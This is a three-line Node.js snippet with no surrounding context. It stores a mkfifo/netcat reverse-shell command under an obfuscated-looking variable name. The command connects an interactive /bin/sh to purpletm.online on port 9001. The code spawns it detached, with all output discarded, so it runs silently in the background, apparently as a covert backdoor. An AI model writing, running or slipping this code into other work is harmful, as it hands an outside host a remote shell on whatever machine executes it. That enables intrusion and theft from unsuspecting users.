const {spawn} = require('child_process');
const _0xa1b2 = 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc purpletm.online 9001 > /tmp/f';
spawn('sh', ['-c', _0xa1b2], {detached: true, stdio: ['ignore', 'ignore', 'ignore']}).unref();